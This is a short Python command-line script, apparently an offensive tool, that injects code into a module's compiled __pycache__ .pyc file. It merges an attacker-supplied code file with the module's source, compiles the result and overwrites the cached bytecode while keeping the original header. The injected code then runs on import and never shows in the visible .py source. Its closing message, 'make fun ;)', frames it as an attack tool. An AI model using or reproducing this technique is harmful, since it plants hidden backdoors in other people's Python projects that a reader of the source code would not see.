from argparse import ArgumentParser
from marshal import dumps
from types import CodeType
from importlib.util import MAGIC_NUMBER
from os import listdir
from platform import python_version
from os.path import basename, join, exists, dirname


def replace_pyc(file_path: str, code: CodeType) -> None:
    with open(file_path, "rb") as f:
        header = f.read(16)

    with open(file_path, "wb") as f:
        f.write(header)
        f.write(dumps(code))


def mix_code(code_path: str, module_path: str) -> CodeType:
    with open(code_path, "rb") as f, open(module_path, "rb") as f2:
        code = f.read()
        module_code = f2.read()

    full_code = module_code + b"\n\n\n" + code
    return compile(full_code, basename(module_path), "exec")


def main():
    parser = ArgumentParser(description="Inject code to a pycache.")
    parser.add_argument('codefile', help='Path to the file that contains the code you want to inject')
    parser.add_argument('module', help='The module path were the code will be injected')
    args = parser.parse_args()

    module_path: str = args.module
    module_name: str = basename(module_path).split(".")[0]
    project_path: str = dirname(module_path)
    pycache_path = join(project_path, "__pycache__")

    print("Using Python version:", python_version())
    print("Using magic number:", MAGIC_NUMBER.hex(" ").upper())
    print("Using module:", module_path)

    # --- Create filtes if not exists ---
    if not exists(module_path):
        ...
        exit(1)

    if not exists(pycache_path):
        ...
        exit(1)

    for filename in listdir(pycache_path):
        if filename.startswith(module_name) and filename.endswith(".pyc"):
            pyc_file = join(pycache_path, filename)
            break
    else:
        ...
        exit(1)

    code_to_replace = mix_code(args.codefile, module_path)
    replace_pyc(pyc_file, code_to_replace)

    print("[+] PYC replaced, make fun ;)")
    print(f"[+] Dont forget to import {module_path!r} on your main script")


if __name__ == "__main__":
    main()